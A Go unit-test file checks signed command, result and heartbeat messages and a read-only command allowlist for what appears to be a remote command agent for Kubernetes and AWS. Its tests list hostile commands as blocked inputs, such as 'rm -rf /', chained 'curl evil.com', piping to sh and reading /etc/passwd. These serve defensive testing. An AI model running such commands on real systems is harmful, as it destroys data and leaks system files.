package proto

import (
	"strings"
	"testing"
	"time"
)

const testSecret = "test-secret"

func TestCommandSignVerifyRoundTrip(t *testing.T) {
	c := Command{ID: NewID(), TS: time.Now().Unix(), Cmd: "kubectl get pods -A", Timeout: 60}
	SignCommand(testSecret, &c)
	if err := VerifyCommand(testSecret, c); err != nil {
		t.Fatalf("valid command rejected: %v", err)
	}
}

func TestVerifyCommandRejectsTampering(t *testing.T) {
	c := Command{ID: NewID(), TS: time.Now().Unix(), Cmd: "kubectl get pods", Timeout: 60}
	SignCommand(testSecret, &c)
	c.Cmd = "rm -rf /"
	if err := VerifyCommand(testSecret, c); err == nil {
		t.Fatal("tampered command accepted")
	}
	c2 := Command{ID: NewID(), TS: time.Now().Unix(), Cmd: "ls", Timeout: 60}
	SignCommand("wrong-secret", &c2)
	if err := VerifyCommand(testSecret, c2); err == nil {
		t.Fatal("wrong-secret command accepted")
	}
}

func TestVerifyCommandRejectsStale(t *testing.T) {
	c := Command{ID: NewID(), TS: time.Now().Add(-10 * time.Minute).Unix(), Cmd: "ls", Timeout: 60}
	SignCommand(testSecret, &c)
	if err := VerifyCommand(testSecret, c); err == nil {
		t.Fatal("stale command accepted")
	}
}

func TestResultAndHeartbeatRoundTrip(t *testing.T) {
	r := Result{ID: "x", TS: time.Now().Unix(), ExitCode: 0, Stdout: "ok"}
	SignResult(testSecret, &r)
	if !VerifyResult(testSecret, r) {
		t.Fatal("valid result rejected")
	}
	r.Stdout = "tampered"
	if VerifyResult(testSecret, r) {
		t.Fatal("tampered result accepted")
	}

	h := Heartbeat{ID: "heartbeat", TS: time.Now().Unix(), Identity: "arn:aws:sts::123:assumed-role/X/Y", Host: "cloudshell"}
	SignHeartbeat(testSecret, &h)
	if !VerifyHeartbeat(testSecret, h) {
		t.Fatal("valid heartbeat rejected")
	}
	h.Identity = "arn:aws:sts::999:assumed-role/Evil/Evil"
	if VerifyHeartbeat(testSecret, h) {
		t.Fatal("tampered heartbeat accepted")
	}
}

func TestReadOnlyAllowlist(t *testing.T) {
	allowed := []string{
		"kubectl get pods -n kube-system",
		"kubectl describe node ip-10-0-0-1",
		"kubectl logs mypod --tail=100",
		"aws ec2 describe-instances --region us-east-1",
		"aws rds describe-db-clusters",
		"aws eks list-clusters",
		"aws sts get-caller-identity",
		"aws s3 ls s3://mybucket/",
		"ping -c 3 example.com",
		"curl -sI https://example.com",
		"df -h",
	}
	for _, cmd := range allowed {
		if err := CheckReadOnly(cmd); err != nil {
			t.Errorf("expected allowed: %q -> %v", cmd, err)
		}
	}

	blocked := []string{
		"kubectl delete pod foo",
		"aws ec2 terminate-instances --instance-ids i-123",
		"kubectl get pods; rm -rf /",
		"kubectl get pods && curl evil.com",
		"kubectl get pods | sh",
		"echo $(whoami)",
		"cat /etc/passwd > /tmp/x",
		"sh -c 'id'",
		"bash",
		"curl -X POST https://example.com",
		"aws s3 rm s3://bucket/file",
	}
	for _, cmd := range blocked {
		if err := CheckReadOnly(cmd); err == nil {
			t.Errorf("expected blocked: %q", cmd)
		}
	}
}

func TestTruncate(t *testing.T) {
	big := strings.Repeat("a", MaxOutputBytes*2)
	out, _, truncated := Truncate(big, "")
	if !truncated {
		t.Fatal("expected truncated=true")
	}
	if len(out) > MaxOutputBytes+32 {
		t.Fatalf("stdout not capped: %d bytes", len(out))
	}
	smallOut, smallErr, truncated := Truncate("hello", "world")
	if truncated || smallOut != "hello" || smallErr != "world" {
		t.Fatal("small payload should pass through untouched")
	}
}
